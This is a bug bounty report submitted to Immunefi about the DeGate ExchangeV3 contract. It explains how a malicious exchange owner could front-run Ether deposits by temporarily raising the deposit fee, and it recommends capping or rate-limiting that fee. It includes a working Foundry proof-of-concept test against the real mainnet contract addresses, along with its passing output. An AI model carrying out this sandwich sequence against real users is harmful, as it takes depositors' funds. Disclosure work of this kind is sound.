# 26189 - \[SC - Insight] Malicious Exchange Owner can sandwich-attack Et...

Submitted on Nov 28th 2023 at 00:54:00 UTC by @peterm for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26189

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x9C07A72177c5A05410cA338823e790876E79D73B#code>

Impacts:

* Theft of funds from the Default Deposit Contract that requires malicious actions from the DeGate Operator.

## Description

## Bug Description

Because there is no value limit on deposit fees on the ExchangeV3 contract and because adjusting these fees has no rate-limit, a malicious exchange owner can front-run users who have their `msg.value` set higher than `amount` on Ether deposits. This difference in value could be due to user mistake, or a malicious front-end.

Normally a user who deposits Ether with `msg.value` greater than `amount` will simply be refunded the difference (assuming no deposit fee), however a malicious exchange owner can steal this value for themselves instead of user refund or revert.

A malicious owner can scan the mempool for any Ether deposit transaction where `msg.value` is greater than `amount`. The amount `x = msg.value - amount` can be directly stolen by the malicious owner by a sandwich attack:

* Spot victim transaction and front-run
* Temporarily set deposit fee equal to `msg.value - amount`
* Front-run user victim deposits `amount` instead of intended `msg.value`
* Malicious owner withdraws difference stolen and sets fee back to normal

## Impact

Users who interact with a malicious front-end or just mistakenly set `amount` less than `msg.value` in Ether deposits can have the arbitrarily large difference between these two stolen by a malicious exchange owner. This sandwich attack is trivial for a malicious owner to execute, at very little cost and potentially great profit. The financial impact is unbounded to the upside and can go undetected for a long period of time (given the deposit fees can be toggled between `[0, unbounded]` with no rate-limit).

## Risk Breakdown

Difficulty to Exploit: Easy Weakness: No value limit or rate-limit on deposit fee CVSS2 Score: 8

## Recommendation

Add hard-limit to deposit fee to bound attack vector or otherwise rate-limit how often/fast the deposit fee can be changed by owner.

## Reference

Contracts in scope, Foundry

## Proof of concept

1. Create empty Foundry project:

```shell
forge init
```

2. Start local anvil fork of mainnet:

```shell
anvil --fork-url <mainnet rpc url>
```

3. Add the following test suite instead of template:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IDefaultDepositContract {}

interface IExchange {
    function getPendingDepositAmount(address from, address tokenAddress) external returns (uint248);

    function setDepositParams(uint256 freeDepositMax, uint256 freeDepositRemained, uint256 freeSlotPerBlock, uint256 depositFee) external;

    function deposit(address from, address to, address tokenAddress, uint248 amount, bytes calldata extraData) external payable;

    function withdrawExchangeFees(address token, address recipient) external;
}


contract PoC is Test {
    IDefaultDepositContract private immutable defaultDepositContract = IDefaultDepositContract(0x54D7aE423Edb07282645e740C046B9373970a168);
    IExchange private immutable exchange = IExchange(0x9C07A72177c5A05410cA338823e790876E79D73B);

    function setUp() external {}

    function testMaliciousOwnerFrontrunUsers() external {
        // Setup accounts
        console.log("------Setting up accounts------");
        address bob = makeAddr("bob");  
        vm.label(bob, "bob");
        address alice = makeAddr("alice");  
        vm.label(alice, "alice");
        address exchangeOwner = 0x9b93e47b7F61ad1358Bd47Cd01206708E85AE5eD;
        vm.label(exchangeOwner, "exchangeOwner");

        address ethDepositAddress = address(0);

        // Bob and Alice both given 5 ether to deposit
        uint248 depositAmount = 5 ether;
        deal(bob, depositAmount);
        deal(alice, depositAmount);
        uint256 bobBalanceBefore = bob.balance;   
        uint256 aliceBalanceBefore = alice.balance; 
        uint256 depositBalanceBefore = address(defaultDepositContract).balance;
        uint256 exchangeOwnerBalanceBefore = exchangeOwner.balance;
        console.log("Bob's ether balance is: %d wei", bobBalanceBefore);
        console.log("Alice's ether balance is: %d wei", aliceBalanceBefore);
        console.log("Default deposit ether balance is: %d wei", depositBalanceBefore);
        console.log("Ether balance of malicious exchange owner is: %d wei", exchangeOwnerBalanceBefore);

        // Malicious owner spots sandwich opportunity, either through malicious front-end or by simply watching mempool for user error
        console.log("------Bob tries to deposit Ether to ExchangeV3 but mistakenly has 'amount' parameter lower than msg.value sent------");
        console.log("------Malicious owner spots sandwich opportunity and front-runs Bob's deposit------");
        vm.startPrank(exchangeOwner);
        uint248 maliciousAmount = 1 wei;        // Malicious front-end or user error
        uint256 freeDepositMax = 0;
        uint256 freeDepositRemained = 0;
        uint256 freeSlotPerBlock = 0;
        uint256 depositFee = depositAmount - maliciousAmount;
        exchange.setDepositParams(freeDepositMax, freeDepositRemained, freeSlotPerBlock, depositFee);
        console.log("Deposit fee temporarily set to difference between Bob's msg.value and 'amount' (%d wei)", depositFee);
        vm.stopPrank();

        // Bob deposits to ExchangeV3, unaware that he is being front-run
        vm.startPrank(bob);
        exchange.deposit{value: depositAmount}(bob, bob, ethDepositAddress, maliciousAmount, "");
        vm.stopPrank();
        vm.prank(exchangeOwner);
        exchange.withdrawExchangeFees(address(0), exchangeOwner);
        assertEq(bob.balance, 0);
        assertEq(address(defaultDepositContract).balance, depositBalanceBefore + maliciousAmount);
        console.log("Exchange owner collects temporarily inflated fee and withdraws it");
        console.log("Exchange owner's ether balance is now: %d wei", exchangeOwner.balance);
        assertEq(exchangeOwner.balance, depositFee);
        console.log("Bob's ether balance is now: %d wei with a deposit value of: %d wei", bob.balance, exchange.getPendingDepositAmount(bob, ethDepositAddress));
        assertEq(exchange.getPendingDepositAmount(bob, ethDepositAddress), maliciousAmount);

        // Malicious owner completes sandwich attack on Bob
        console.log("Setting deposit fee back to 0 wei, completing sandwich attack on Bob");
        depositFee = 0;
        vm.prank(exchangeOwner);
        exchange.setDepositParams(freeDepositMax, freeDepositRemained, freeSlotPerBlock, depositFee);

        console.log("------Alice deposits same Ether amount as Bob, but correctly sets 'amount' parameter and msg.value equal------");
        console.log("------Malicious owner has no sandwich opportunity and lets Alice deposit as normal------");
        vm.startPrank(alice);
        exchange.deposit{value: depositAmount}(alice, alice, ethDepositAddress, depositAmount, "");
        vm.stopPrank();
        assertEq(alice.balance, 0);
        assertEq(address(defaultDepositContract).balance, depositBalanceBefore + maliciousAmount + depositAmount);
        assertEq(exchange.getPendingDepositAmount(alice, ethDepositAddress), depositAmount);
        console.log("Alice's ether balance is now: %d wei with a deposit value of: %d wei", alice.balance, exchange.getPendingDepositAmount(alice, ethDepositAddress));
    }
}
```

4. Run the following forge test:

```shell
forge test --match-test testMaliciousOwnerFrontrunUsers  --fork-url http://127.0.0.1:8545 -vv --via-ir
```

5. Output is:

```txt
Running 1 test for test/Counter.t.sol:PoC
[32m[PASS][0m testMaliciousOwnerFrontrunUsers() (gas: 276125)
Logs:
  ------Setting up accounts------
  Bob's ether balance is: 5000000000000000000 wei
  Alice's ether balance is: 5000000000000000000 wei
  Default deposit ether balance is: 328293880694913421416 wei
  Ether balance of malicious exchange owner is: 0 wei
  ------Bob tries to deposit Ether to ExchangeV3 but mistakenly has 'amount' parameter lower than msg.value sent------
  ------Malicious owner spots sandwich opportunity and front-runs Bob's deposit------
  Deposit fee temporarily set to difference between Bob's msg.value and 'amount' (4999999999999999999 wei)
  Exchange owner collects temporarily inflated fee and withdraws it
  Exchange owner's ether balance is now: 4999999999999999999 wei
  Bob's ether balance is now: 0 wei with a deposit value of: 1 wei
  Setting deposit fee back to 0 wei, completing sandwich attack on Bob
  ------Alice deposits same Ether amount as Bob, but correctly sets 'amount' parameter and msg.value equal------
  ------Malicious owner has no sandwich opportunity and lets Alice deposit as normal------
  Alice's ether balance is now: 0 wei with a deposit value of: 5000000000000000000 wei

Test result: [32mok[0m. [32m1[0m passed; [31m0[0m failed; [33m0[0m skipped; finished in 3.19ms
 
Ran 1 test suites: [32m1[0m tests passed, [31m0[0m failed, [33m0[0m skipped (1 total tests)
```
